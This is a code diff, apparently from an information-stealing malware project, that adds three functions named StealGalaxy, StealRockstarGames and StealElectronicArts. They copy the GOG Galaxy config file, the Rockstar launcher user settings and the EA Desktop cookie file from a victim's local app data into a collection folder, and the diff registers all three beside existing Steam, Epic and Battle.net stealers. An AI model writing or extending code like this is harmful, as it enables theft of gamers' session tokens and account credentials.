@@ -1940,7 +1940,49 @@ class get_data:
             logs_handler(f"[ERROR] - getting Steam files: {str(Error)}")
             return "null"
         
-    
+            
+    async def StealGalaxy(self, directory_path) -> None:
+        try:
+            galaxy_path = os.path.join(self.localappdata, "GOG.com", "Galaxy", "Configuration", "config.json")
+            destination_path = os.path.join(directory_path, "Games", "Galaxy")
+            if not os.path.exists(galaxy_path):
+                return
+            else:
+                if os.path.isfile(galaxy_path):
+                    shutil.copy(galaxy_path, os.path.join(destination_path, "config.json"))
+                else:
+                    pass
+        except Exception as Error:
+            logs_handler(f"Error getting Galaxy (GOG) {str(Error)}")
+
+    async def StealRockstarGames(self, directory_path):
+        try:
+            rockstar_path = os.path.join(self.localappdata, "Rockstar Games", "Launcher", "settings_user.dat")
+            destination_path = os.path.join(directory_path, "Games", "Rockstar Games")
+            if not os.path.exists(rockstar_path):
+                return
+            else:
+                if os.path.isfile(rockstar_path):
+                    shutil.copy(rockstar_path, os.path.join(destination_path, "settings_user.dat"))
+                else:
+                    pass
+        except Exception as Error:
+            logs_handler(f"Error getting Rockstar Games {str(Error)}")
+
+    async def StealElectronicArts(self, directory_path):
+        try:
+            electronic_arts_path = os.path.join(self.localappdata, "Electronic Arts", "EA Desktop", "Windows", "cookie.ini")
+            destination_path = os.path.join(directory_path, "Games", "Electronic Arts" )
+            if not os.path.exists(electronic_arts_path):
+                return
+            else:
+                if os.path.isfile(electronic_arts_path):
+                    shutil.copy(electronic_arts_path, os.path.join(destination_path, "cookie.ini"))
+                else:
+                    pass
+        except Exception as Error:
+            logs_handler(f"Error getting Electronic Arts {str(Error)}")
+
 
     async def StealBattleNet(self, directory_path) -> None:
         battle_net_path = os.path.join(self.appdata, 'Battle.net')
@@ -2129,6 +2171,9 @@ class get_data:
                 self.StealEpicGames(filePath),
                 self.StealGrowtopia(filePath),
                 self.StealSteamFiles(filePath),
+                self.StealGalaxy(filePath),
+                self.StealRockstarGames(filePath),
+                self.StealElectronicArts(filePath),
                 self.StealBattleNet(filePath),
             ]
             
